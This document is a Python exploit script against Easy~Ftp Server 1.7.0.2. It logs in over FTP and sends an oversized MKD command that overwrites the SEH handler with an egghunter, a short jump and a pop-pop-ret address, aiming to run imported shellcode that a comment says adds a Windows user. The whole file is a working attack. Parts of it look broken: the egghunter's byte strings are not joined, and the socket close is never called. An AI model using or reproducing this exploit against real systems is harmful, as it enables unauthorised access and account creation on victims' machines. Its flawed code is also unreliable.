#!/usr/bin/python

# Title: Easy~Ftp Server v1.7.0.2 Post-Authentication BoF
# Original Author: dookie2000ca || Windows XP SP3 Professional
# Author: b33f - Ruben Boonen
# Windows XP Home SP1
# Software link: http://cdnetworks-us-2.dl.sourceforge.net/project/easyftpsvr/easyftpsvr/1.7.0.2-en/easyftpsvr-1.7.0.2.zip

from payload import buf
import socket

def shell_attack(target_machine, target_port):

#-------------------------------------------------------------------------------
#SE Handler is overwritten - offset to SEH 256
#short jump \xEB\x07
#pop pop ret rpcrt4.dll 78011926
#badchars 0x00 0x0a 0x2f 0x5c
#-------------------------------------------------------------------------------

    bunny =b"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    "\x77\x30\x30\x74" # egghunter marker w00t
    "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

    #win32_adduser - PASS=u EXITFUNC=seh USER=fuck Size=228 Encoder=ShikataGaNai
   

    payload = b"A"*7 + b"w00tw00t" + buf + b"A"*10 + b"\xEB\x07\x90\x90" + b"\x26\x19\x01\x78" + b"\x90"*25 + bunny + b"A"*133

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect((target_machine,target_port))
    s.recv(1024)
    s.send(b'USER b33f\r\n')
    s.recv(1024)
    s.send(b'PASS b33f\r\n')
    s.recv(1024)
    s.send(b'MKD ' + payload + b'\r\n')
    s.recv(1024)
    s.send(b'QUIT\r\n')
    s.close